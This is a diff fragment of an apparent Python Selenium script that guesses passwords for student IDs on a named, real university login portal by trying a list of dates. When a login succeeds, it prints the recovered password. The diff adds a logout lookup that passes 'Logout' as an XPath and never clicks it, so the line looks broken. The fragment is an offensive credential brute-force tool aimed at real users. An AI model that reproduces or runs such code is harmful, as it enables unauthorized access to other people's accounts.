@@ -54,6 +54,7 @@ for date in date_list:
         print("Attempt Success!!!")
         if driver.current_url == "http://lykan.bsi.ac.id/beranda.html":
             print("Password for {} is {}".format(nim, date))
+            driver.find_element(By.XPATH, "Logout")
             break
     # if driver.current_url == "http://lykan.bsi.ac.id/verifikasi.html":
     #     driver.get("http://lykan.bsi.ac.id/login.html")
